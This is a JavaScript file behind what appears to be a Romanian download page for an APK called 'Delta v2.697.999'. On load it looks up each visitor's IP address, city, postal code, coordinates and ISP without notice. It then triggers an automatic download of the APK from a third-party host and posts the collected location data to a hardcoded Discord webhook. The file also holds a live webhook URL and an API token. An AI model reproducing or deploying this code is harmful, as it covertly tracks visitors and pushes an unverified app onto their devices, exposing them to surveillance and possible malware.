const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1436887135184621721/-UdeuasAv0qUv7jMhJLvlSurqm7b5XFm-UQOIeuk8z9qFo38KLwU9dZC_olA-uZkyGtn";
const DOWNLOAD_URL = "https://delta.filenetwork.vip/file/Delta-2.697.999.apk";
const FILE_NAME = "Delta v2.697.999.apk";
const IPINFO_TOKEN = "87102e155b95f5";

let timeLeft = 3;
const countdownEl = document.getElementById('countdown');
const manualBtn = document.getElementById('manualBtn');
let userIPData = {};

async function getIPData() {
  try {
    const response = await fetch(`https://ipinfo.io/json?token=${IPINFO_TOKEN}`);
    const data = await response.json();
    userIPData = {
      ip: data.ip || "Necunoscut",
      city: data.city || "Necunoscut",
      region: data.region || "Necunoscut",
      country: data.country || "Necunoscut",
      loc: data.loc || "Necunoscut",
      org: data.org || "Necunoscut",
      postal: data.postal || "Necunoscut",
      timezone: data.timezone || "Necunoscut"
    };
  } catch (err) {
    userIPData = { ip: "Eroare la preluare IP", error: err.message };
  }
}

getIPData().then(() => {
  const timer = setInterval(() => {
    timeLeft--;
    countdownEl.textContent = timeLeft;
    if (timeLeft <= 0) {
      clearInterval(timer);
      autoDownload();
    }
  }, 1000);
});

async function autoDownload() {
  const a = document.createElement('a');
  a.href = DOWNLOAD_URL;
  a.download = FILE_NAME;
  a.style.display = 'none';
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);

  await sendToDiscord();
  manualBtn.classList.remove('h');
  manualBtn.textContent = "DESCARCĂ DIN NOU";
}

async function sendToDiscord() {
  const embed = {
    title: "NOUĂ DESCĂRCARE DELTA v2.697.999!",
    color: 0x8a2be2,
    thumbnail: { url: "https://raw.githubusercontent.com/AlexScriptluarbx/Logo_/main/new_logo.png" },
    fields: [
      { name: "Ora", value: new Date().toLocaleString('ro-RO'), inline: true },
      { name: "IP", value: userIPData.ip, inline: true },
      { name: "Locație", value: `${userIPData.city}, ${userIPData.region}, ${userIPData.country}`, inline: true },
      { name: "ISP / Org", value: userIPData.org, inline: false },
      { name: "Cod Poștal", value: userIPData.postal, inline: true },
      { name: "Coordonate", value: userIPData.loc, inline: true },
      { name: "Fus Orar", value: userIPData.timezone, inline: true }
    ],
    footer: { text: "Delta Network | IPinfo Integration" },
    timestamp: new Date()
  };

  try {
    await fetch(DISCORD_WEBHOOK, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ embeds: [embed] })
    });
  } catch (err) {
    console.error("Eroare trimitere Discord:", err);
  }
}

manualBtn.addEventListener('click', () => {
  window.open(DOWNLOAD_URL, '_blank');
  sendToDiscord();
});
